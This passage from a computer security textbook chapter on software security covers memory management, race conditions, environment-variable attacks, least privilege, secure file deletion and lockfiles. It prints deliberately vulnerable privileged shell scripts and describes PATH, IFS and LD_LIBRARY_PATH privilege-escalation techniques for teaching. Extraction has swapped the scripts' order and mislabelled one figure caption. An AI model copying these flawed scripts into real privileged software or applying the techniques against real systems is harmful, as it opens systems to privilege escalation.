particular group \\r\\nof bits is interpreted as representing a character, an integer, a floating-point number, \\r\\na memory address (pointer), or some more complex interpretation depends on the \\r\\nprogram operations used to manipulate it and ultimately on the specific machine \\r\\ninstructions executed. Different languages provide varying capabilities for restricting \\r\\nand validating assumptions on the interpretation of data in variables. If the language \\r\\nincludes strong typing, then the operations performed on any specific type of data \\r\\nwill be limited to appropriate manipulations of the values.6\\r\\n This greatly reduces the \\r\\nlikelihood of inappropriate manipulation and use of variables introducing a flaw in \\r\\nthe program. Other languages, though, allow a much more liberal interpretation of \\r\\ndata and permit program code to explicitly change their interpretation. The widely \\r\\nused language C has this characteristic, as we discussed in Section 10.1. In particular, \\r\\nit allows easy conversion between interpreting variables as integers and interpreting \\r\\nthem as memory addresses (pointers). This is a consequence of the close relationship \\r\\nbetween C language constructs and the capabilities of machine language instructions, \\r\\nand it provides significant benefits for system level programming. Unfortunately, it \\r\\nalso allows a number of errors caused by the inappropriate manipulation and use of \\r\\npointers. The prevalence of buffer overflow issues, as we discussed in Chapter 10, is \\r\\none consequence. A related issue is the occurrence of errors due to the incorrect \\r\\nmanipulation of pointers in complex data structures, such as linked lists or trees, \\r\\nresulting in corruption of the structure or changing of incorrect data values. Any such \\r\\nprogramming bugs could provide a means for an attacker to subvert the correct \\r\\noperation of a program or simply to cause it to crash.\\r\\nThe best defense against such errors is to use a strongly typed programming \\r\\nlanguage. However, even when the main program is written in such a language, it will \\r\\nstill access and use operating system services and standard library routines, which are \\r\\ncurrently most likely written in languages like C, and could potentially contain such \\r\\nflaws. The only counter to this is to monitor any bug reports for the system being \\r\\nused and to try and not use any routines with known, serious bugs. If a loosely typed \\r\\nlanguage like C is used, then due care is needed whenever values are cast between \\r\\ndata types to ensure that their use remains valid.\\r\\nCorrect Use of Memory\\r\\nRelated to the issue of interpretation of data values is the allocation and management \\r\\nof dynamic memory storage, generally using the process heap. Many programs, which \\r\\nmanipulate unknown quantities of data, use dynamically allocated memory to store \\r\\ndata when required. This memory must be allocated when needed and released when \\r\\ndone. If a program fails to correctly manage this process, the consequence may be a \\r\\nsteady reduction in memory available on the heap to the point where it is completely \\r\\nexhausted. This is known as a memory leak, and often the program will crash once the \\r\\navailable memory on the heap is exhausted. This provides an obvious mechanism for \\r\\nan attacker to implement a denial-of-service attack on such a program.\\r\\n6\\r\\nProvided that the compiler or interpreter does not contain any bugs in the translation of the high-level \\r\\nlanguage statements to the machine instructions actually executed.\\r\\nM11_STAL0611_04_GE_C11.indd 399 10/11/17 3:02 PM\\n\\n\\n400 CHAPTER 11 / SOFTWARE SECURITY\\r\\nMany older languages, including C, provide no explicit support for dynamically \\r\\nallocated memory. Instead support is provided by explicitly calling standard library \\r\\nroutines to allocate and release memory. Unfortunately, in large, complex programs, \\r\\ndetermining exactly when dynamically allocated memory is no longer required can \\r\\nbe a difficult task. As a consequence, memory leaks in such programs can easily occur \\r\\nand can be difficult to identify and correct. There are library variants that implement \\r\\nmuch higher levels of checking and debugging such allocations that can be used to \\r\\nassist this process.\\r\\nOther languages like Java and C++ manage memory allocation and release \\r\\nautomatically. While such languages do incur an execution overhead to support this \\r\\nautomatic management, the resulting programs are generally far more reliable. The \\r\\nuse of such languages is strongly encouraged to avoid memory management problems.\\r\\nPreventing Race Conditions with Shared Memory\\r\\nAnother topic of concern is management of access to common, shared memory by \\r\\nseveral processes or threads within a process. Without suitable synchronization of \\r\\naccesses, it is possible that values may be corrupted, or changes lost, due to over\\ufffelapping access, use, and replacement of shared values. The resulting race condition\\r\\noccurs when multiple processes and threads compete to gain uncontrolled access to \\r\\nsome resource. This problem is a well-known and documented issue that arises when \\r\\nwriting concurrent code, whose solution requires the correct selection and use of \\r\\nappropriate synchronization primitives. Even so, it is neither easy nor obvious what \\r\\nis the most appropriate and efficient choice. If an incorrect sequence of synchroniza\\ufffetion primitives is chosen, it is possible for the various processes or threads to dead\\ufffelock, each waiting on a resource held by the other. There is no easy way of recovering \\r\\nfrom this flaw without terminating one or more of the programs. An attacker could \\r\\ntrigger such a deadlock in a vulnerable program to implement a denial-of-service \\r\\nupon it. In large complex applications, ensuring that deadlocks are not possible can \\r\\nbe very difficult. Care is needed to carefully design and partition the problem to \\r\\nlimit areas where access to shared memory is needed and to determine the best \\r\\nprimitives to use.\\r\\n11.4 INTERACTING WITH THE OPERATING SYSTEM \\r\\nAND OTHER PROGRAMS\\r\\nThe third component of our model of computer programs is that it executes on a \\r\\ncomputer system under the control of an operating system. This aspect of a computer \\r\\nprogram is often not emphasized in introductory programming courses; however, \\r\\nfrom the perspective of writing secure software, it is critical. Excepting dedicated \\r\\nembedded applications, in general, programs do not run in isolation on most computer \\r\\nsystems. Rather, they run under the control of an operating system that mediates \\r\\naccess to the resources of that system and shares their use between all the currently \\r\\nexecuting programs.\\r\\nThe operating system constructs an execution environment for a process when \\r\\na program is run, as illustrated in Figure 10.4. In addition to the code and data for the \\r\\nM11_STAL0611_04_GE_C11.indd 400 10/11/17 3:02 PM\\n\\n\\n11.4 / INTERACTING WITH THE OPERATING SYSTEM 401\\r\\nprogram, the process includes information provided by the operating system. These \\r\\ninclude environment variables, which may be used to tailor the operation of the \\r\\nprogram, and any command-line arguments specified for the program. All such data \\r\\nshould be considered external inputs to the program whose values need validation \\r\\nbefore use, as discussed in Section 11.2.\\r\\nGenerally these systems have a concept of multiple users on the system. \\r\\nResources, like files and devices, are owned by a user and have permissions granting \\r\\naccess with various rights to different categories of users. We discussed these concepts \\r\\nin detail in Chapter 4. From the perspective of software security, programs need \\r\\naccess to the various resources, such as files and devices, they use. Unless appropriate \\r\\naccess is granted, these programs will likely fail. However, excessive levels of access \\r\\nare also dangerous because any bug in the program could then potentially compro\\ufffemise more of the system.\\r\\nThere are also concerns when multiple programs access shared resources, such \\r\\nas a common file. This is a generalization of the problem of managing access to shared \\r\\nmemory, which we discussed in Section 11.3. Many of the same concerns apply, and \\r\\nappropriate synchronization mechanisms are needed.\\r\\nWe now discuss each of these issues in more detail.\\r\\nEnvironment Variables\\r\\nEnvironment variables are a collection of string values inherited by each process \\r\\nfrom its parent that can affect the way a running process behaves. The operating sys\\ufffetem includes these in the process’s memory when it is constructed. By default, they \\r\\nare a copy of the parent’s environment variables. However, the request to execute \\r\\na new program can specify a new collection of values to use instead. A program can \\r\\nmodify the environment variables in its process at any time, and these in turn will be \\r\\npassed to its children. Some environment variable names are well known and used \\r\\nby many programs and the operating system. Others may be custom to a specific \\r\\nprogram. Environment variables are used on a wide variety of operating systems, \\r\\nincluding all UNIX variants, DOS and Microsoft Windows systems, and others.\\r\\nWell-known environment variables include the variable PATH, which specifies \\r\\nthe set of directories to search for any given command; IFS, which specifies the \\r\\nword boundaries in a shell script; and LD_LIBRARY_PATH, which specifies the list of \\r\\ndirectories to search for dynamically loadable libraries. All of these have been used \\r\\nto attack programs.\\r\\nThe security concern for a program is that these provide another path for \\r\\nuntrusted data to enter a program and hence need to be validated. The most com\\ufffemon use of these variables in an attack is by a local user on some system attempting \\r\\nto gain increased privileges on the system. The goal is to subvert a program that grants \\r\\nsuperuser or administrator privileges, coercing it to run code of the attacker’s selec\\ufffetion with these higher privileges.\\r\\nSome of the earliest attacks using environment variables targeted shell scripts \\r\\nthat executed with the privileges of their owner rather than the user running them. \\r\\nConsider the simple example script shown in Figure 11.6a. This script, which might \\r\\nbe used by an ISP, takes the identity of some user, strips any domain specification if \\r\\nincluded, and then retrieves the mapping for that user to an IP address. Because that \\r\\nM11_STAL0611_04_GE_C11.indd 401 10/11/17 3:02 PM\\n\\n\\n402 CHAPTER 11 / SOFTWARE SECURITY\\r\\ninformation is held in a directory of privileged user accounting information, general \\r\\naccess to that directory is not granted. Instead, the script is run with the privileges of \\r\\nits owner, which does have access to the relevant directory. This type of simple utility \\r\\nscript is very common on many systems. However, it contains a number of serious \\r\\nflaws. The first concerns the interaction with the PATH environment variable. This \\r\\nsimple script calls two separate programs: sed and grep. The programmer assumes \\r\\nthat the standard system versions of these scripts would be called. But they are speci\\ufffefied just by their filename. To locate the actual program, the shell will search each \\r\\ndirectory named in the PATH variable for a file with the desired name. The attacker \\r\\nsimply has to redefine the PATH variable to include a directory they control, which \\r\\ncontains a program called grep, for example. Then when this script is run, the attack\\ufffeer’s grep program is called instead of the standard system version. This program \\r\\ncan do whatever the attacker desires, with the privileges granted to the shell script. \\r\\nTo address this vulnerability, the script could be rewritten to use absolute names for \\r\\neach program. This avoids the use of the PATH variable, though at a cost in readability \\r\\nand portability. Alternatively, the PATH variable could be reset to a known default \\r\\nvalue by the script, as shown in Figure 11.6b. Unfortunately, this version of the script \\r\\nis still vulnerable, this time due to the IFS environment variable. This is used to sepa\\uffferate the words that form a line of commands. It defaults to a space, tab, or newline \\r\\ncharacter. However, it can be set to any sequence of characters. Consider the effect \\r\\nof including the “=” character in this set. Then the assignment of a new value to the \\r\\nPATH variable is interpreted as a command to execute the program PATH with the \\r\\nlist of directories as its argument. If the attacker has also changed the PATH variable \\r\\nto include a directory with an attack program PATH, then this will be executed when \\r\\nthe script is run. It is essentially impossible to prevent this form of attack on a shell \\r\\nscript. In the worst case, if the script executes as the root user, then total compromise \\r\\nof the system is possible. Some recent UNIX systems do block the setting of critical \\r\\nenvironment variables such as these for programs executing as root. However, that \\r\\ndoes not prevent attacks on programs running as other users, possibly with greater \\r\\naccess to the system.\\r\\nIt is generally recognized that writing secure, privileged shell scripts is very \\r\\ndifficult. Hence their use is strongly discouraged. At best, the recommendation is \\r\\nFigure 11.6 Vulnerable Shell Scripts\\r\\n(a) Example vulnerable privileged shell script\\r\\n(b) Still vulnerable privileged shell script\\r\\n#!/bin/bash\\r\\nPATH=\"/sbin:/bin:/usr/sbin:/usr/bin\"\\r\\nexport PATH\\r\\nuser=`echo $1 |sed \\'s/@.*$//\\'`\\r\\ngrep $user /var/local/accounts/ipaddrs\\r\\n#!/bin/bash\\r\\nuser=`echo $1 |sed \\'s/@.*$//\\'`\\r\\ngrep $user /var/local/accounts/ipaddrs\\r\\nM11_STAL0611_04_GE_C11.indd 402 10/11/17 3:02 PM\\n\\n\\nto change only the group, rather than user, identity and to reset all critical environ\\ufffement variables. This at least ensures the attack cannot gain superuser privileges. If a \\r\\nscripted application is needed, the best solution is to use a compiled wrapper program \\r\\nto call it. The change of owner or group is done using the compiled program, which \\r\\nthen constructs a suitably safe set of environment variables before calling the desired \\r\\nscript. Correctly implemented, this provides a safe mechanism for executing such \\r\\nscripts. A very good example of this approach is the use of the suexec wrapper pro\\ufffegram by the Apache Web server to execute user CGI scripts. The wrapper program \\r\\nperforms a rigorous set of security checks before constructing a safe environment \\r\\nand running the specified script.\\r\\nEven if a compiled program is run with elevated privileges, it may still be vul\\ufffenerable to attacks using environment variables. If this program executes another \\r\\nprogram, depending on the command used to do this, the PATH variable may still \\r\\nbe used to locate it. Hence any such program must reset this to known safe values \\r\\nfirst. This at least can be done securely. However, there are other vulnerabilities. \\r\\nEssentially all programs on modern computer systems use functionality provided \\r\\nby standard library routines. When the program is compiled and linked, the code \\r\\nfor these standard libraries could be included in the executable program file. This is \\r\\nknown as a static link. With the use of static links every program loads its own copy \\r\\nof these standard libraries into the computer’s memory. This is wasteful, as all these \\r\\ncopies of code are identical. Hence most modern systems support the concept of \\r\\ndynamic linking. A dynamically linked executable program does not include the code \\r\\nfor common libraries, but rather has a table of names and pointers to all the func\\ufffetions it needs to use. When the program is loaded into a process, this table is resolved \\r\\nto reference a single copy of any library, shared by all processes needing it on the \\r\\nsystem. However, there are reasons why different programs may need different ver\\ufffesions of libraries with the same name. Hence there is usually a way to specify a list of \\r\\ndirectories to search for dynamically loaded libraries. On many UNIX systems this \\r\\nis the LD_LIBRARY_PATH environment variable. Its use does provide a degree of \\r\\nflexibility with dynamic libraries. But again it also introduces a possible mechanism \\r\\nfor attack. The attacker constructs a custom version of a common library, placing \\r\\nthe desired attack code in a function known to be used by some target, dynamically \\r\\nlinked program. Then by setting the LD_LIBRARY_PATH variable to reference the \\r\\nattacker’s copy of the library first, when the target program is run and calls the known \\r\\nfunction, the attacker’s code is run with the privileges of the target program. To pre\\ufffevent this type of attack, a statically linked executable can be used, at a cost of memory \\r\\nefficiency. Alternatively, again some modern operating systems block the use of this \\r\\nenvironment variable when the program executed runs with different privileges.\\r\\nLastly, apart from the standard environment variables, many programs use \\r\\ncustom variables to permit users to generically change their behavior just by setting \\r\\nappropriate values for these variables in their startup scripts. Again, such use means \\r\\nthese variables constitute untrusted input to the program that needs to be validated. \\r\\nOne particular danger is to merge values from such a variable with other informa\\ufffetion into some buffer. Unless due care is taken, a buffer overflow can occur, with \\r\\nconsequences as we discussed in Chapter 10. Alternatively, any of the issues with \\r\\ncorrect interpretation of textual information we discussed in Section 11.2 could\\r\\nalso apply.\\r\\n11.4 / INTERACTING WITH THE OPERATING SYSTEM 403\\r\\nM11_STAL0611_04_GE_C11.indd 403 10/11/17 3:02 PM\\n\\n\\n404 CHAPTER 11 / SOFTWARE SECURITY\\r\\nAll of these examples illustrate how care is needed to identify the way in which \\r\\na program interacts with the system in which it executes and to carefully consider the \\r\\nsecurity implications of these assumptions.\\r\\nUsing Appropriate, Least Privileges\\r\\nThe consequence of many of the program flaws we discuss in both this chapter and \\r\\nin Chapter 10 is that the attacker is able to execute code with the privileges and \\r\\naccess rights of the compromised program or service. If these privileges are greater \\r\\nthan those available already to the attacker, then this results in a privilege escalation, \\r\\nan important stage in the overall attack process. Using the higher levels of privilege \\r\\nmay enable the attacker to make changes to the system, ensuring future use of these \\r\\ngreater capabilities. This strongly suggests that programs should execute with the \\r\\nleast amount of privileges needed to complete their function. This is known as the \\r\\nprinciple of least privilege and is widely recognized as a desirable characteristic in a \\r\\nsecure program.\\r\\nNormally when a user runs a program, it executes with the same privileges and \\r\\naccess rights as that user. Exploiting flaws in such a program does not benefit an \\r\\nattacker in relation to privileges, although the attacker may have other goals, such as \\r\\na denial-of-service attack on the program. However, there are many circumstances \\r\\nwhen a program needs to utilize resources to which the user is not normally granted \\r\\naccess. This may be to provide a finer granularity of access control than the standard \\r\\nsystem mechanisms support. A common practice is to use a special system login for \\r\\na service and make all files and directories used by the service assessable only to that \\r\\nlogin. Any program used to implement the service runs using the access rights of this \\r\\nsystem user and is regarded as a privileged program. Different operating systems \\r\\nprovide different mechanisms to support this concept. UNIX systems use the set \\r\\nuser or set group options. The access control lists used in Windows systems provide a \\r\\nmeans to specify alternate owner or group access rights if desired. We discussed such \\r\\naccess control concepts elaborately in Chapter 4.\\r\\nWhenever a privileged program runs, care must be taken to determine the \\r\\nappropriate user and group privileges required. Any such program is a potential \\r\\ntarget for an attacker to acquire additional privileges, as we noted in the discussion \\r\\nof concerns regarding environment variables and privileged shell scripts. One key \\r\\ndecision involves whether to grant additional user or just group privileges. Where \\r\\nappropriate the latter is generally preferred. This is because on UNIX and related \\r\\nsystems, any file created will have the user running the program as the file’s owner, \\r\\nenabling users to be more easily identified. If additional special user privileges are \\r\\ngranted, this special user is the owner of any new files, masking the identity of the \\r\\nuser running the program. However, there are circumstances when providing privi\\ufffeleged group access is not sufficient. In those cases care is needed to manage, and log \\r\\nif necessary, use of these programs.\\r\\nAnother concern is ensuring that any privileged program can modify only those \\r\\nfiles and directories necessary. A common deficiency found with many privileged \\r\\nprograms is for them to have ownership of all associated files and directories. If the \\r\\nprogram is then compromised, the attacker has greater scope for modifying and cor\\uffferupting the system. This violates the principle of least privilege. A very common exam\\ufffeple of this poor practice is seen in the configuration of many Web servers and their \\r\\nM11_STAL0611_04_GE_C11.indd 404 10/11/17 3:02 PM\\n\\n\\ndocument directories. On most systems the Web server runs with the privilege of a \\r\\nspecial user, commonly www or similar. Generally the Web server only needs the ability \\r\\nto read files it is serving. The only files it needs write access to are those used to store \\r\\ninformation provided by CGI scripts, file uploads, and the like. All other files should \\r\\nhave write access to the group of users managing them, but not the Web server. How\\ufffeever, common practice by system managers with insufficient security awareness is to \\r\\nassign the ownership of most files in the Web document hierarchy to the Web server. \\r\\nConsequently, should the Web server be compromised, the attacker can then change \\r\\nmost of the files. The widespread occurrence of Web defacement attacks is a direct \\r\\nconsequence of this practice. The server is typically compromised by an attack such \\r\\nas the PHP remote code injection attack we discussed in Section 11.2. This allows the \\r\\nattacker to run any PHP code of their choice with the privileges of the Web server. The \\r\\nattacker may then replace any pages the server has write access to. The result is almost \\r\\ncertain embarrassment for the organization. If the attacker accesses or modifies form \\r\\ndata saved by previous CGI script users, then more serious consequences can result.\\r\\nCare is needed to assign the correct file and group ownerships to files and direc\\ufffetories managed by privileged programs. Problems can manifest particularly when a pro\\ufffegram is moved from one computer system to another or when there is a major upgrade \\r\\nof the operating system. The new system might use different defaults for such users and \\r\\ngroups. If all affected programs, files, and directories are not correctly updated, then \\r\\neither the service will fail to function as desired, or worse, may have access to files it \\r\\nshould not, which may result in corruption of files. Again this may be seen in moving \\r\\na Web server to a newer, different system, where the Web server user might change \\r\\nfrom www to www-data. The affected files may not just be those in the main Web server \\r\\ndocument hierarchy but may also include files in users’ public Web directories.\\r\\nThe greatest concerns with privileged programs occur when such programs \\r\\nexecute with root or administrator privileges. These provide very high levels of access \\r\\nand control to the system. Acquiring such privileges is typically the major goal of an \\r\\nattacker on any system. Hence any such privileged program is a key target. The prin\\ufffeciple of least privilege indicates that such access should be granted as rarely and as \\r\\nbriefly as possible. Unfortunately, due to the design of operating systems and the need \\r\\nto restrict access to underlying system resources, there are circumstances when such \\r\\naccess must be granted. Classic examples include the programs used to allow a user \\r\\nto login or to change passwords on a system; such programs are only accessible to the \\r\\nroot user. Another common example is network servers that need to bind to a privi\\ufffeleged service port.7\\r\\n These include Web, Secure Shell (SSH), SMTP mail delivery, \\r\\nDNS, and many other servers. Traditionally, such server programs executed with root \\r\\nprivileges for the entire time they were running. Closer inspection of the privilege \\r\\nrequirements reveals that they only need root privileges to initially bind to the desired \\r\\nprivileged port. Once this is done the server programs could reduce their user privi\\ufffeleges to those of another special system user. Any subsequent attack is then much \\r\\nless significant. The problems resulting from the numerous security bugs in the once \\r\\nwidely used sendmail mail delivery program are a direct consequence of it being a \\r\\nlarge, complex monolithic program that ran continuously as the root user.\\r\\n7\\r\\nPrivileged network services use port numbers less than 1024. On UNIX and related systems, only the root \\r\\nuser is granted the privilege to bind to these ports.\\r\\n11.4 / INTERACTING WITH THE OPERATING SYSTEM 405\\r\\nM11_STAL0611_04_GE_C11.indd 405 10/11/17 3:02 PM\\n\\n\\n406 CHAPTER 11 / SOFTWARE SECURITY\\r\\nWe now recognize that good defensive program design requires that large, com\\ufffeplex programs be partitioned into smaller modules, each granted the privileges they \\r\\nrequire, only for as long as they need them. This form of program modularization \\r\\nprovides a greater degree of isolation between the components, reducing the conse\\ufffequences of a security breach in one component. In addition, being smaller, each com\\ufffeponent module is easier to test and verify. Ideally the few components that require \\r\\nelevated privileges can be kept small and subject to much greater scrutiny than the \\r\\nremainder of the program. The popularity of the postfix mail delivery program, \\r\\nnow widely replacing the use of sendmail in many organizations, is partly due to \\r\\nits adoption of these more secure design guidelines.\\r\\nA further technique to minimize privilege is to run potentially vulnerable \\r\\nprograms in some form of sandbox that provides greater isolation and control of \\r\\nthe executing program from the wider system. The runtime for code written in lan\\ufffeguages such as Java includes this type of functionality. Alternatively, UNIX-related \\r\\nsystems provide the chroot system function to limit a program’s view of the file \\r\\nsystem to just one carefully configured and isolated section of the file system. This \\r\\nis known as a chroot jail. Provided this is configured correctly, even if the program \\r\\nis compromised, it may only access or modify files in the chroot jail section of the \\r\\nfile system. Unfortunately, correct configuration of a chroot jail is difficult. If created \\r\\nincorrectly, the program may either fail to run correctly or worse may still be able \\r\\nto interact with files outside the jail. While the use of a chroot jail can significantly \\r\\nlimit the consequences of compromise, it is not suitable for all circumstances, and \\r\\nnor is it a complete security solution. A further recently developed alternative for \\r\\nthis is the use of containers, also known as application virtualization, which we will \\r\\ndiscuss in Section 12.8.\\r\\nSystems Calls and Standard Library Functions\\r\\nExcept on very small, embedded systems, no computer program contains all of the \\r\\ncode it needs to execute. Rather, programs make calls to the operating system to \\r\\naccess the system’s resources and to standard library functions to perform common \\r\\noperations. When using such functions, programmers commonly make assumptions \\r\\nabout how they actually operate. Most of the time they do indeed seem to perform \\r\\nas expected. However, there are circumstances when the assumptions a programmer \\r\\nmakes about these functions are not correct. The result can be that the program does \\r\\nnot perform as expected. Part of the reason for this is that programmers tend to focus \\r\\non the particular program they are developing and view it in isolation. However, on \\r\\nmost systems this program will simply be one of many running and sharing the avail\\ufffeable system resources. The operating system and library functions attempt to manage \\r\\ntheir resources in a manner that provides the best performance to all the programs \\r\\nrunning on the system. This does result in requests for services being buffered, rese\\ufffequenced, or otherwise modified to optimize system use. Unfortunately, there are \\r\\ntimes when these optimizations conflict with the goals of the program. Unless the \\r\\nprogrammer is aware of these interactions and explicitly codes for them, the resulting \\r\\nprogram may not perform as expected.\\r\\nAn excellent illustration of these issues is given by Venema in his discussion \\r\\nof the design of a secure file shredding program [VENE06]. The problem is how to \\r\\nM11_STAL0611_04_GE_C11.indd 406 10/11/17 3:02 PM\\n\\n\\nsecurely delete a file so its contents cannot subsequently be recovered. Just using the \\r\\nstandard file delete utility or system call does not suffice, as this simply removes the \\r\\nlinkage between the file’s name and its contents. The contents still exist on the disk \\r\\nuntil those blocks are eventually reused in another file. Reversing this operation is \\r\\nrelatively straightforward, and undelete programs have existed for many years to do \\r\\nthis. Even when blocks from a deleted file are reused, the data in the files can still be \\r\\nrecovered because not all traces of the previous bit values are removed [GUTM96]. \\r\\nConsequently, the standard recommendation is to repeatedly overwrite the data con\\ufffetents with several distinct bit patterns to minimize the likelihood of the original data \\r\\nbeing recovered. Hence a secure file shredding program might perhaps implement \\r\\nthe algorithm like that shown in Figure 11.7a. However, when an obvious implemen\\ufffetation of this algorithm is tried, the file contents were still recoverable afterwards. \\r\\nVenema details a number of flaws in this algorithm that mean the program does \\r\\nnot behave as expected. These flaws relate to incorrect assumptions about how the \\r\\nrelevant system functions operate and include the following:\\r\\n• When the file is opened for writing, the system will write the new data to same \\r\\ndisk blocks as the original data. In practice, the operating system may well \\r\\nassume that the existing data are no longer required, remove them from asso\\ufffeciation with the file, then allocate new unused blocks to write the data to. What \\r\\nthe program should do is open the file for update, indicating to the operating \\r\\nsystem that the existing data are still required.\\r\\n• When the file is overwritten with pattern, the data are written immediately to \\r\\ndisk. In the first instance the data are copied into a buffer in the application, \\r\\nmanaged by the standard library file I/O routines. These routines delay writing \\r\\nthis buffer until it is sufficiently full, the program flushes the buffer, or the file \\r\\nis closed. If the file is relatively small, this buffer may never fill up before the \\r\\nprogram loops round, seeks back to the start of the file, and writes the next pat\\ufffetern. In such a case the library code will decide that because the previously writ\\ufffeten data have changed, there is no need to write the data to disk. The program \\r\\nneeds to explicitly insist that the buffer be flushed after each pattern is written.\\r\\n• When the I/O buffers are flushed and the file is closed, the data are then written \\r\\nto disk. However, there is another layer of buffering in the operating system’s \\r\\nfile handling code. This layer buffers information being read from and written \\r\\nto files by all of the processes currently running on the computer system. It \\r\\nthen reorders and schedules these data for reading and writing to make the \\r\\nmost efficient use of physical device accesses. Even if the program flushes the \\r\\ndata out of the application buffer into the file system buffer, the data will not \\r\\nbe immediately written. If new replacement data are flushed from the program, \\r\\nagain they will most likely replace the previous data and not be written to disk, \\r\\nbecause the file system code will assume that the earlier values are no longer \\r\\nrequired. The program must insist that the file system synchronize the data with \\r\\nthe values on the device in order to ensure that the data are physically trans\\ufffeferred to the device. However, doing this results in a performance penalty on \\r\\nthe system because it forces device accesses to occur at less than optimal times. \\r\\nThis penalty impacts not just this file shredding program but every program \\r\\ncurrently running on the system.\\r\\n11.4 / INTERACTING WITH THE OPERATING SYSTEM 407\\r\\nM11_STAL0611_04_GE_C11.indd 407 10/11/17 3:02 PM\\n\\n\\n408 CHAPTER 11 / SOFTWARE SECURITY\\r\\nWith these changes, the algorithm for a secure file shredding program changes to \\r\\nthat shown in Figure 11.7b. This is certainly more likely to achieve the desired result; \\r\\nhowever, examined more closely, there are yet more concerns.\\r\\nModern disk drives and other storage devices are managed by smart controllers, \\r\\nwhich are dedicated processors with their own memory. When the operating system \\r\\ntransfers data to such a device, the data are stored in buffers in the controller’s memory. \\r\\nThe controller also attempts to optimize the sequence of transfers to the actual device. \\r\\nIf it detects that the same data block is being written multiple times, the controller may \\r\\ndiscard the earlier data values. To prevent this the program needs some way to com\\ufffemand the controller to write all pending data. Unfortunately, there is no standard \\r\\nmechanism on most operating systems to make such a request. When Apple was devel\\ufffeoping its MacOS secure file delete program, it found it necessary to create an addi\\ufffetional file control option8\\r\\n to generate this command. And its use incurs a further \\r\\nperformance penalty on the system. But there are still more problems. If the device is \\r\\na nonmagnetic disk (e.g., a flash memory drive), then their controllers try to minimize \\r\\nthe number of writes to any block. This is because such devices only support a limited \\r\\nnumber of rewrites to any block. Instead they may allocate new blocks when data are \\r\\nrewritten instead of reusing the existing block. Also, some types of journaling file sys\\ufffetems keep records of all changes made to files to enable fast recovery after a disk crash. \\r\\nBut these records can be used to access previous data contents.\\r\\n8\\r\\nThe Mac OS X F_FULLFSYNC fcntl system call commands the drive to flush all buffered data to \\r\\npermanent storage.\\r\\nFigure 11.7 Example Global Data Overflow Attack\\r\\n(a) Initial secure file shredding program algorithm\\r\\n(b) Better secure file shredding program algorithm\\r\\npatterns = [10101010, 01010101, 11001100, 00110011, 00000000, 11111111,\\r\\n...]\\r\\nopen file for writing\\r\\nfor each pattern\\r\\n seek to start of file\\r\\n overwrite file contents with pattern\\r\\nclose file\\r\\nremove file\\r\\npatterns = [10101010, 01010101, 11001100, 00110011, 00000000, 11111111,\\r\\n...]\\r\\nopen file for update\\r\\nfor each pattern\\r\\n seek to start of file\\r\\n overwrite file contents with pattern\\r\\n flush application write buffers\\r\\n sync file system write buffers with device\\r\\nclose file\\r\\nremove file\\r\\nM11_STAL0611_04_GE_C11.indd 408 10/11/17 3:02 PM\\n\\n\\nAll of this indicates that writing a secure file shredding program is actually \\r\\nan extremely difficult exercise. There are so many layers of code involved, each of \\r\\nwhich makes assumptions about what the program really requires in order to pro\\ufffevide the best performance. When these assumptions conflict with the actual goals \\r\\nof the program, the result is that the program fails to perform as expected. A secure \\r\\nprogrammer needs to identify such assumptions and resolve any conflicts with the \\r\\nprogram goals. Because identifying all relevant assumptions may be very difficult, it \\r\\nalso means exhaustively testing the program to ensure that it does indeed behave \\r\\nas expected. When it does not, the reasons should be determined and the invalid \\r\\nassumptions identified and corrected.\\r\\nVenema concludes his discussion by noting that in fact the program may actu\\ufffeally be solving the wrong problem. Rather than trying to destroy the file contents \\r\\nbefore deletion, a better approach may in fact be to overwrite all currently unused \\r\\nblocks in the file systems and swap space, including those recently released from \\r\\ndeleted files.\\r\\nPreventing Race Conditions with Shared System Resources\\r\\nThere are circumstances in which multiple programs need to access a common \\r\\nsystem resource, often a file containing data created and manipulated by multiple \\r\\nprograms. Examples include mail client and mail delivery programs sharing access \\r\\nto a user’s mailbox file, or various users of a Web CGI script updating the same \\r\\nfile used to save submitted form values. This is a variant of the issue, discussed in \\r\\nSection 11.3—synchronizing access to shared memory. As in that case, the solution is \\r\\nto use an appropriate synchronization mechanism to serialize the accesses to prevent \\r\\nerrors. The most common technique is to acquire a lock on the shared file, ensuring \\r\\nthat each process has appropriate access in turn. There are several methods used for \\r\\nthis, depending on the operating system in use.\\r\\nThe oldest and most general technique is to use a lockfile. A process must \\r\\ncreate and own the lockfile in order to gain access to the shared resource. Any other \\r\\nprocess that detects the existence of a lockfile must wait until it is removed before \\r\\ncreating its own to gain access. There are several concerns with this approach. First, \\r\\nit is purely advisory. If a program chooses to ignore the existence of the lockfile \\r\\nand access the shared resource, then the system will not prevent this. All programs \\r\\nusing this form of synchronization must cooperate. A more serious flaw occurs in \\r\\nthe implementation. The obvious implementation is first to check that the lockfile \\r\\ndoes not exist then create it. Unfortunately, this contains a fatal deficiency. Consider \\r\\ntwo processes each attempting to check and create this lockfile. The first checks and \\r\\ndetermines that the lockfile does not exist. However, before it is able to create the \\r\\nlockfile, the system suspends the process to allow other processes to run. At this \\r\\npoint the second process also checks that the lockfile does not exist, creates it, and \\r\\nproceeds to start using the shared resource. Then it is suspended and control returns \\r\\nto the first process, which proceeds to also create the lockfile and access the shared \\r\\nresource at the same time. The data in the shared file will then likely be corrupted. \\r\\nThis is a classic illustration of a race condition. The problem is that the process of \\r\\nchecking the lockfile does not exist, and then creating the lockfile must be executed \\r\\none after the other, without the possibility of interruption. This is known as an atomic \\r\\noperation. The correct implementation in this case is not to test separately for the \\r\\n11.4 / INTERACTING WITH THE OPERATING SYSTEM 409\\r\\nM11_STAL0611_04_GE_C11.indd 409 10/11/17 3:02 PM\\n\\n\\n410 CHAPTER 11 / SOFTWARE SECURITY\\r\\npresence of the lockfile, but always to attempt to create it. The specific options used \\r\\nin the file create state that if the file already exists, then the attempt must fail and \\r\\nreturn a suitable error code. If it fails, the process waits for a period and then tries \\r\\nagain until it succeeds. The operating system implements this function as an atomic \\r\\noperation, providing guaranteed controlled access to the resource. While the use of a \\r\\nlockfile is a classic technique, it has the advantage that the presence of a lock is quite \\r\\nclear because the lockfile is seen in a directory listing. It also allows the administra\\ufffetor to easily remove a lock left by a program that either crashed or otherwise failed \\r\\nto remove the lock.\\r\\nThere are more modern and alternative locking mechanisms available for files. \\r\\nThese may be advisory and/or mandatory, where the operating system guarantees \\r\\nthat a locked file cannot be accessed inappropriately. The issue with mandatory locks \\r\\nis the mechanisms for removing them should the locking process crash or otherwise \\r\\nnot release the lock. These mechanisms are also implemented differently on differ\\ufffeent operating systems. Hence care is needed to ensure that the chosen mechanism \\r\\nis used correctly.\\r\\nFigure 11.8 illustrates the use of the advisory flock call in a Perl script. This \\r\\nmight typically be used in a Web CGI form 